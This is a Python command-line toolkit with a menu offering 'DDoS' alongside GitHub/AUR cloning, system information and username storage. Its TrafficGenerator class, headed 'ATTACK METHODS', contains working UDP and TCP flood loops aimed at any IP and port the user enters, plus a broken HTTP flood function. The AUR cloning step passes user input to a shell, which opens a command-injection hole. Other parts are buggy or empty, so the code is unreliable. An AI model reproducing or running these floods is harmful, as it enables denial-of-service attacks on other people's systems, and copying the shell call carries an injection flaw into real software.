# Copyright (c) 2026 Nora Rose
# Licensed under MIT License

import platform
import psutil
import socket
import os
import sys
import subprocess
import socketserver
import threading
import requests
import random
import time
import json
import hashlib
import sys
import logging
from hmac import digest
from stylelibrary import color
from stylelibrary import style

logging.basicConfig(filename="application .log", level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

class RepoManager: # This class is responsible for managing repositories, specifically GitHub and AUR (Arch User Repository). It provides functionality to clone repositories from both platforms and handles user interactions related to repository management.
    options = {"1": "Git", "2": "AUR", "3": "Exit"}
    
    def check_internet(self, url="https://www.google.com/", timeout=5):
      try:
         while True:
           requests.head(url, timeout=timeout)
           self.logger.info("INTERNET CONNECTION IS WORKING")
           return True
      except requests.RequestException as e:
         self.logger.critical(f"CRITICAL COULD NOT DETECTED INTERNET CONNECTION. {type(e).__name__}", exc_info=True)
         return False
         

    def __init__(self): # The constructor initializes the base URLs for GitHub and AUR, and checks if the current system is running Arch Linux. This information is used later to determine if certain features (like AUR cloning) are available.
        self.github_base = "https://github.com"
        self.aur_base = "https://aur.archlinux.org"
        self.logger = logging.getLogger(f"{__name__}.RepoManager")
        if platform.system() == "Linux": # Check if the operating system is Linux before trying to access Linux-specific features
         try:
            # Only call this on Linux to avoid FileNotFoundError on Windows/macOS
            self.is_arch = platform.freedesktop_os_release().get("ID") == "arch"
         except (AttributeError, OSError) as e:
            self.is_arch = False
            self.logger.critical(F"CRITICAL COULD NOT DETECTED OPERATING SYSTEM {type(e).__name__}", exc_info=True)
        else:
        # On Windows or macOS, it's definitely not Arch Linux
         self.is_arch = False
         self.logger.info("This non-linux arch base system")
  
      

    def client(self): # This method provides a user interface for selecting repository management options. It displays a menu of options (Git, AUR, Exit) and prompts the user to make a selection. Based on the user's choice, it calls the appropriate method to handle Git cloning or AUR cloning, or exits the menu. 
     try:
        while True:
          print("------------ REPOSITORY ------------")
          for key, value in self.options.items():
            print(f"{key}. {value}")
          print("------------ REPOSITORY ------------")
          choice = input("╰─▸ ")
    
          while choice not in self.options:
            print(style.bold_style(color.rgb_text(255, 0, 0, "Invalid choice. Please select a valid option.")))
            print("------------ REPOSITORY ------------")
            for key, value in self.options.items():
             print(f"{key}. {value}")
            print("------------ REPOSITORY ------------")
            choice = input("╰─▸ ")

          if choice == "1":
             self.github()
          if choice == "2":
             self.aur()
          if choice == "3" : 
             break  

     except KeyboardInterrupt:
         print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))

    def github(self): # This method handles the Git cloning functionality. It prompts the user to enter a GitHub username and repository name, constructs the appropriate URL for cloning, and executes the git clone command. It also provides feedback on whether the cloning was successful or if it failed.
      try:
       while True:
        if self.check_internet():
         print("Please add Persons Github Name | or 'q' to back")
         github_name = input("╰─▸")
         if github_name.lower() == "q": break  
         print("Please add a Repository Name to Started the Git Clone:")
         repository_name = input("╰─▸")
         if not repository_name.endswith(".git"):
          repository_name += ".git" # Ensure the repository name ends with .git for cloning
         url = f"{self.github_base}/{github_name}/{repository_name}"
         result = subprocess.run(["git", "clone", url])
         if result.returncode == 0:
          print(style.bold_style(color.rgb_text(0, 255, 0, "Success!")))
          cd_name_getting = os.path.splitext(repository_name)[0] # Extract the directory name from the repository name by removing the .git extension
          print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
         else:
          print(style.bold_style(color.rgb_text(255, 0, 0, "Clone failed.")))
        else:
         print(style.bold_style(color.rgb_text(255, 0, 0, "No internet connection detected.")))
      except KeyboardInterrupt:
         pass

    def aur(self): # This method handles the AUR cloning functionality. It prompts the user to enter a repository name, constructs the appropriate URL for cloning from the AUR, and executes the git clone command. It also checks if the system is running Arch Linux before attempting to clone, and provides feedback on whether the cloning was successful or if it failed.
     try:
       while True:
        if self.check_internet():   
         print(style.bold_style(color.rgb_text(255, 165, 0,"Please add a Repository Name to Started the Git Clone | or 'q' to back")))
         repository_name = input("╰─▸")
         if repository_name.lower() == "q": break 
         if not repository_name.endswith(".git"):
          repository_name += ".git"
         url = f"{self.aur_base}/{repository_name}"
         result = subprocess.run(["git", "clone", url])
         if result.returncode == 0: # Check if the git clone command was successful (returncode 0 indicates success)
          print(style.bold_style(color.rgb_text(0, 255, 0, "Success!")))
          cd_name_getting = os.path.splitext(repository_name)[0]
          print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
          if self.is_arch:
           subprocess.run(f"cd {cd_name_getting} && ls", shell=True)
          else:
           print(style.bold_style(color.rgb_text(255, 0, 0, "You're not on a Arch Linux system")))
         else:
          print(style.bold_style(color.rgb_text(255, 0, 0, "Clone failed.")))
        else:
          print(style.bold_style(color.rgb_text(255, 0, 0, "No internet connection detected.")))
     except KeyboardInterrupt:
        pass
   

class TrafficGenerator:
    options = {"1": "UPD", "2": "TCP", "3": "HTTP", "4": "Exit"}
    def __init__(self):
     pass
    def client(self):
     try:
        while True:
          print("------------ ATTACK METHODS ------------")
          for key, value in self.options.items():
            print(f"{key}. {value}")
          print("------------ ATTACK METHODS ------------")
          choice = input("╰─▸ ")
          
          while choice not in self.options:
            print(style.bold_style(color.rgb_text(255, 0, 0, "Invalid choice. Please select a valid option.")))
            print("------------ ATTACK METHODS ------------")
            for key, value in self.options.items():
             print(f"{key}. {value}")
            print("------------ ATTACK METHODS ------------")
            choice = input("╰─▸ ")
          
          if choice == "1":
             self.udp_flood()

          if choice == "2":
             self.tcp_flood()

          if choice == "3":
             self.http_flood() 

          if choice == "4":
             break


     except KeyboardInterrupt:
       print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))

    def  udp_flood(self): # This method implements a UDP flood attack. It prompts the user to enter a target IP address and port number, creates a UDP socket, and sends random bytes to the target in an infinite loop. The method also handles keyboard interrupts to allow the user to stop the attack gracefully.
       try:
         while True:
           target_ip = input("put in ip --> ")
           ipport = int(input("now put in ip port --> "))
           client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
           client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
           packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
           client.sendto(packet, (target_ip, ipport))
           print(f"Targeting {target_ip}:{ipport} with UDP packet")
           try:
            while True:
              client.sendto(packet, (target_ip, ipport))
              print(f"Packet sent to {target_ip}:{ipport}")
           except KeyboardInterrupt:
             client.close()
       
       except KeyboardInterrupt:
        print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))

    def tcp_flood(self): # This method implements a TCP flood attack. It prompts the user to enter a target IP address and port number, creates a TCP socket, and sends random bytes to the target in an infinite loop. The method also handles connection reset errors (which may occur if the target closes the connection) and keyboard interrupts to allow the user to stop the attack gracefully.
      try:
       while True:  
         target_ip = input("IP --> ")
         ipport = int(input("IP PORT --> "))
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket.SOCK_STREAM SPECIFICALLY THIS SOCKET WILL USE TCP 
         print(f"Start attacking on {target_ip}:{ipport}")
         client.connect((target_ip,ipport))
         client.send(b"\x10" * 5024)
         print(f"sending attack {target_ip}:{ipport}") 

     #for _ in range(5):
         try:
           while True:
            client.send(b"\x10" * 5024)
            print(f"sending attack {target_ip}:{ipport}")
         except KeyboardInterrupt:
          client.close()
         sys.exit()
      except ConnectionResetError:
       print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")
    def http_flood(self, target_url, num_threads): # This method implements an HTTP flood attack. It prompts the user to enter a target URL and the number of threads to use for the attack. It then creates multiple threads that continuously send HTTP GET requests to the target URL with random User-Agent headers. The method also handles request exceptions (which may occur if the target is unreachable) and keyboard interrupts to allow the user to stop the attack gracefully.
      try:
        while True:
          
         target_url = input("URL -->")
         num_threads = int(input("Threads -->"))
         
         user_agents = [
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
           "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36",
           "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
          ]
        
      except KeyboardInterrupt:
         pass
         def send_request(target_url, num_threads):
          while True: 
            try:
              headers = {"User-Agent": random.choice(user_agents)}

              response = requests.get(target_url, headers=headers)
              print(f"Senting request with {headers}{['User-Agent']}")
            except requests.exceptions.RequestException:
              print("Connection failed.")
 
            for _ in range(num_threads):
             thread = threading.Thread(target=send_request)
            thread.start
            print(F"HTTP FLOOD HAS SHART IT {num_threads} ON {target_url}")    
    


class SecurityToolkit:
    pass

class Systeminfologging:
   def __init__(self):
      self.system_path = "system.json"
      
      
   def logging(self):
        # System info using platform module
        print(style.bold_style(color.rgb_text( 0, 0, 255, f"System: {platform.system()}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255, f"Machine: {platform.machine()}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255, f"Processor: {platform.processor()}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255, f"OS Version: {platform.version()}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255, f"Python version: {platform.python_version()}")))

        # CPU info using psutil
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"CPU cores: {psutil.cpu_count(logical=False)}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Logical CPUs: {psutil.cpu_count(logical=True)}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"CPU usage (%): {psutil.cpu_percent(interval=1)}")))

        # Memory info using psutil
        memory = psutil.virtual_memory()
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Total Memory: {memory.total / (1024 ** 3):.2f} GB")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Used Memory: {memory.used / (1024 ** 3):.2f} GB")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Free Memory: {memory.free / (1024 ** 3):.2f} GB")))

        # Disk info using psutil
        disk = psutil.disk_usage('/')
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB")))

        # Network info using socket
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Hostname: {hostname}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"IP Address: {ip_address}")))

        # Python runtime info using sys
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Python executable: {sys.executable}")))
        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Python version: {sys.version}")))

        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Platform: {sys.platform}")))

        system_info = {
          "system": platform.system(),
          "machine": platform.machine(),
          "processor": platform.processor(),
          "os_version": platform.version(),
          "python_version": platform.python_version(),
          "cpu_cores": psutil.cpu_count(logical=False),
          "logical_cpus": psutil.cpu_count(logical=True),
          "cpu_usage_percent": psutil.cpu_percent(interval=1),
          "total_memory_gb": memory.total / (1024 ** 3),
          "used_memory_gb": memory.used / (1024 ** 3),
          "free_memory_gb": memory.free / (1024 ** 3),
          "total_disk_space_gb": disk.total / (1024 ** 3),
          "used_disk_space_gb": disk.used / (1024 ** 3),
          "free_disk_space_gb": disk.free / (1024 ** 3),
          "hostname": hostname,
          "ip_address": ip_address,
          "python_executable": sys.executable,
          "python_version_detail": sys.version,
          "platform": sys.platform
         }
        with open(self.system_path, "w") as f:
         json.dump(system_info, f, indent=4)
         f.close()
         print(style.bold_style(color.rgb_text(0, 255, 0, f"System information saved to {self.system_path}")))

class SessionManager:
    def __init__(self): # The constructor initializes the file name for storing the username and calls the load_user method to either load an existing username or prompt the user to enter a new one. The username is stored in an instance variable for later use.
       self.logger = logging.getLogger(f"{__name__}.SessionManager")
       self.file_name = "username.json"
       self.username = self.load_user()
       
    def load_user(self): # This method checks if the username.json file exists. If it does, it reads the file and loads the username from it. If the file does not exist, it prompts the user to enter a username, validates that it's not empty, and then saves it to username.json for future use. The method returns the username, which is stored in the instance variable self.username.
     if os.path.exists(self.file_name):
       with open(self.file_name, "r") as f:
           data = json.load(f)
           self.username = data.get("username", "User")
     else:
        name = input("Enter your username:")
        while name == "":
          print("It seems that your username was empty please re-enter it!")
          name = input("Enter your username:")  
        with open(self.file_name, "w") as f: # Creates the username.json and ready to writes the username into it 
         json.dump({"username": name}, f) # Dumps the username into the json file
         print(style.bold_style(color.rgb_text(0, 255, 0, f"Thanks, {name}! Your username has been saved")))
         return name
        
    def change_username(self): # This method allows the user to change their username. It first checks if the username.json file exists, and if it does, it removes the file to clear the previous username. It then prompts the user to enter a new username, validates that it's not empty, and saves it to username.json. Finally, it updates the instance variable self.username with the new username.
     if os.path.exists(self.file_name):
        os.remove(self.file_name)
        print(style.bold_style(color.rgb_text(255, 0, 0, "The previous username has been removed please add new one")))
        self.username = self.load_user()
        
class Client:
    
    def __init__(self): # The constructor initializes instances of the RepoManager, TrafficGenerator, SecurityToolkit, Systeminfologging, and SessionManager classes. These instances are stored as attributes of the Client class and will be used to access the functionality provided by each of these components throughout the client's operations.
        self.logger = logging.getLogger(f"{__name__}.Client")
        self.repo = RepoManager()
        self.networking = TrafficGenerator()
        self.security = SecurityToolkit()
        self.system_log = Systeminfologging()
        self.user_session = SessionManager()

    def client(self): # This method provides the main user interface for the client application. It displays a menu of options (DDoS, Hasher, Git, System Info, Change Username, Exit) and prompts the user to make a selection. Based on the user's choice, it calls the appropriate method to handle DDoS attacks, hashing operations, Git repository management, system information logging, or username changes. The menu continues to display until the user chooses to exit or interrupts the application with a keyboard interrupt.
        options = {"1": "DDoS", "2": "Hasher", "3": "Git", "4": "System Info", "5": "Change Username", "6": "Exit"}

        try:
         while True:
          print(f"Welcome back, {self.user_session.username}")
          print("------------ MENU ------------")
          for key, value in options.items():
            print(f"{key}. {value}")
          print("------------ MENU ------------")
          choice = input("╰─▸ ")

          while choice not in options:
            print(style.bold_style(color.rgb_text(255, 0, 0, "Invalid choice. Please select a valid option.")))
            print("------------ MENU ------------")
            for key, value in options.items():
             print(f"{key}. {value}")
            print("------------ MENU ------------")
            choice = input("╰─▸ ")
          if choice == "1":
               self.networking.client()
          if choice == "3":
               self.repo.client()
          if choice == "4":
             self.system_log.logging()
          if choice == "5":
               self.user_session.change_username()
          if choice == "6":
             print(style.bold_style(color.rgb_text(0, 255, 0, "Exiting Application Safely....")))
             time.sleep(1)
             print(style.bold_style(color.rgb_text(0, 255, 0, "1")))
             time.sleep(1)
             print(style.bold_style(color.rgb_text(0, 255, 0, "2")))
             time.sleep(1)
             print(style.bold_style(color.rgb_text(0, 255, 0, "3")))
             break        
        except KeyboardInterrupt: # This except block catches a KeyboardInterrupt exception, which occurs when the user presses Ctrl+C to interrupt the program. When this happens, it prints a message indicating that the application has been interrupted by the keyboard and then allows the program to exit gracefully.
           print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))

if __name__ == "__main__": 
    application = Client()
    application.client()
